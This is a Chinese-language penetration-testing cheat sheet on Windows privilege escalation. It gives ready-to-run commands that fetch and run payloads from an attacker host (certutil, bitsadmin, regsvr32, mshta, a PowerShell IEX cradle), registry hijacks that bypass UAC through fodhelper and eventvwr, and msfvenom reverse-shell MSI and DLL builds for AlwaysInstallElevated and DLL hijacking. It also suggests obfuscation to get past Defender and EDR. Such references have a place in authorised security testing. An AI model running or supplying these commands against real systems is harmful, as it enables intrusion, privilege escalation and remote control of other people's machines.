---
cmd_type: PrivEsc
os: windows
tags:
  - cmd
syntax: certutil -urlcache -split -f http://<LHOST>/nc.exe C:\Windows\Temp\nc.exe
---

# LOLBAS 与 UAC 绕过

## 适用场景

- 需要落地工具（下载/编码/执行）但杀软敏感、想借系统自带二进制（LOLBAS）规避。
- 当前用户在管理员组但受 UAC 限制，需绕过 UAC 提权到高完整性。
- `alwaysInstallElevated` 开启，可直接装恶意识 MSI 提权。
- 程序加载 DLL 时可注入 DLL hijacking。

## 枚举命令

```bash
whoami /groups                          # 看是否在管理员组 / 完整性级别（Medium/High）
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
```

## 利用步骤

### 1. LOLBAS 常用表

```bash
# certutil：下载文件
certutil -urlcache -split -f http://<LHOST>/nc.exe C:\Windows\Temp\nc.exe
# certutil：base64 编码/解码
certutil -encode payload.exe payload.b64
certutil -decode payload.b64 payload.exe

# regsvr32：远程加载并执行脚本（sct）
regsvr32 /s /n /u /i:http://<LHOST>/payload.sct scrobj.dll

# mshta：执行远程 HTA
mshta http://<LHOST>/payload.hta

# bitsadmin：后台下载
bitsadmin /transfer job /download /priority high http://<LHOST>/nc.exe C:\Windows\Temp\nc.exe

# rundll32：加载 DLL 执行（配合 js/命令）
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("calc.exe")

# powershell 下载 cradle
powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1')"
```

### 2. UAC 绕过（fodhelper / eventvwr 注册表劫持）

```bash
# fodhelper：写入注册表后触发，弹高完整性 cmd
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd.exe /c start cmd.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f
fodhelper.exe

# eventvwr：劫持 Microsoft\Event Viewer 调试项
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /d "cmd.exe /c start cmd.exe" /f
eventvwr.exe
```

### 3. alwaysInstallElevated 提权

```bash
# 两处注册表都返回 0x1 即开启
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# 用 msfvenom 生成恶意 MSI，再安装
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f msi -o shell.msi
msiexec /quiet /qn /i shell.msi
```

### 4. DLL hijacking 概念

```bash
# 目标程序加载缺失/可写目录里的 DLL 时，放同名恶意 DLL
# 枚举程序加载的 DLL（Procmon 过滤 .dll）
# 生成恶意 DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o evil.dll
# 放到程序加载目录或 PATH 中更早的位置，等待程序以高权限启动
```

## 常见坑

- LOLBAS 命令会被 Win Defender 与 EDR 监控，落地后可能被拦，可换编码/混淆或换二进制。
- UAC 绕过仅在当前用户已在管理员组时有效，普通用户需先完成提权到管理员。
- `alwaysInstallElevated` 需要**两处**注册表都是 `0x1`，只开一处无效。
- fodhelper/eventvwr 的注册表劫持在 Win10 较新版本可能被默认 UAC 设置拦，必要时用其它 bypass。
- DLL hijacking 依赖程序高权限启动且能写加载目录，先 `icacls` 确认目录可写性。

## 参考开源项目

- LOLBAS — https://lolbas-project.github.io/
- PowerSploit — https://github.com/PowerShellMafia/PowerSploit
- nishang — https://github.com/samratashok/nishang
